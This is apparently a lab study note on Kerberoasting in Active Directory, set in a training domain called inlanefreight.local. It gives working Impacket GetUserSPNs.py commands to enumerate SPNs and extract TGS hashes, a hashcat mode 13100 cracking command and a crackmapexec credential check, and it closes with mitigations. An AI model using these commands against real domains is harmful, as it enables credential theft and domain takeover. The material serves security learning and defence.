
 **Kerberoasting - Exploiting Service Principal Names (SPNs) in AD**

Kerberoasting is an **Active Directory attack** targeting **service accounts with SPNs** to extract **Kerberos Ticket Granting Service (TGS) tickets** and crack them offline.

## **1. What is Kerberoasting?**

- A **lateral movement** and **privilege escalation** attack.
- Exploits **Service Principal Names (SPNs)** linked to **domain accounts running services**.
- TGS tickets for SPNs are **encrypted with the service account's NTLM hash**.
- **Offline cracking** using **Hashcat** or **John the Ripper** may reveal **cleartext passwords**.
----
## **2. Why is this Dangerous?**

- **Service accounts** often have **elevated privileges** (Domain Admin, Local Admin, MSSQL Admin).
- **Passwords are often weak/reused**, making cracking feasible.
- Gaining a **high-privilege service account** can **compromise the domain**.
---
# **3. Performing a Kerberoasting Attack**

The attack can be conducted from: 
- **Linux (Non-domain joined, using Impacket)**  
- **Windows (PowerView, Rubeus, Mimikatz, setspn.exe)**  
- **SYSTEM context or domain user session**

 **Required Conditions**
- Any **valid domain user credentials**.
- **Access to a Domain Controller (DC)**.
- **A tool to request TGS tickets** (e.g., **GetUserSPNs.py** from Impacket).
---
# **4. Kerberoasting from Linux using Impacket**

**Step 1: Install Impacket**
 
```bash
sudo python3 -m pip install impacket
```
- Impacket provides **GetUserSPNs.py**, which allows **Kerberoasting**.


**Step 2: Enumerate SPNs in the Domain**

Find all **Service Principal Names (SPNs)** running under user accounts.
```bash
GetUserSPNs.py -dc-ip <DC-IP> <DOMAIN>/<USER>
```

Example output
```bash
ServicePrincipalName                           Name          MemberOf                     PasswordLastSet
---------------------------------------------  ------------  ----------------------
MSSQLSvc/SQL01.inlanefreight.local:1433        sqladmin      Domain Admins               2023-02-15
backupjob/veeam01.inlanefreight.local          backupuser    Backup Operators            2023-02-12
```
- Lists **domain accounts running services**.
- Identifies **potential targets with high privileges**.


**Step 3: Request TGS Tickets**

Extract Kerberos **TGS-REP** tickets for offline cracking.
```bash
GetUserSPNs.py -dc-ip <DC-IP> <DOMAIN>/<USER> -request
```

**Step 4: Save TGS Ticket to a File**
```bash
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqladmin -outputfile sqladmin_tgs
```
- Saves TGS hashes for **offline cracking**.


**Step 5: Crack the Hash with Hashcat**

Use **Hashcat mode 13100** to brute-force the **TGS-REP hash**.
```bash
hashcat -m 13100 sqladmin_tgs /usr/share/wordlists/rockyou.txt
```


Step 6: Verify Credentials & Access

```bash
crackmapexec smb 172.16.5.5 -u sqladmin -p Password123!

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\sqladmin:Password123! (Pwn3d!)
```


---

# **5. Efficacy of the Attack**

**Possible Outcomes:**

1. **TGS Cracked → Domain Admin Access**  **(Critical Risk)**
2. **TGS Cracked → Low-privilege Account**  **(Useful for lateral movement)**
3. **TGS Uncrackable → No Immediate Gain**  **(Medium Risk, depends on password strength)**

**Mitigation Strategies:**
- **Use strong, randomly generated passwords for service accounts.**
- **Monitor Kerberos ticket requests (Event ID 4769).**
- **Restrict service accounts from logging in interactively.**
- **Use Managed Service Accounts (MSAs) to rotate passwords automatically.**
